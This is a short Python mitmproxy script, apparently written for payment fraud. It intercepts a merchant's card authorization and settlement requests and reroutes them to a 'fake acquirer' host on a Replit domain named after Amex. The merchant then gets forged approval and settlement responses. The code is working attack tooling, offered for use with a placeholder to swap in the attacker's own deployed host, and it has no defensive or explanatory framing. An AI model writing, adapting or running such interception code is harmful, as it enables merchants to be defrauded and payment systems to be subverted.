from mitmproxy import http

# CHANGE THIS to your actual deployed Replit URL host (no https:// and no trailing slash)
FAKE_ACQUIRER_HOST = "amex-virtual.lavishstyle44.repl.co"

def request(flow: http.HTTPFlow):
    # Intercept authorization requests
    if "payment_intent" in flow.request.pretty_url or "authorize" in flow.request.pretty_url:
        print(f"🔵 Intercepted authorization request: {flow.request.pretty_url}")

        flow.request.host = FAKE_ACQUIRER_HOST
        flow.request.scheme = "https"
        flow.request.port = 443
        flow.request.path = "/authorize"
        flow.request.headers["Host"] = FAKE_ACQUIRER_HOST

    # Intercept settlement/capture requests
    elif "settle" in flow.request.pretty_url or "capture" in flow.request.pretty_url:
        print(f"💸 Intercepted settlement request: {flow.request.pretty_url}")

        flow.request.host = FAKE_ACQUIRER_HOST
        flow.request.scheme = "https"
        flow.request.port = 443
        flow.request.path = "/settle"
        flow.request.headers["Host"] = FAKE_ACQUIRER_HOST

def response(flow: http.HTTPFlow):
    if flow.request.path == "/authorize":
        print(f"🟢 Authorization response sent back to merchant.")
    elif flow.request.path == "/settle":
        print(f"🟢 Settlement response sent back to merchant.")

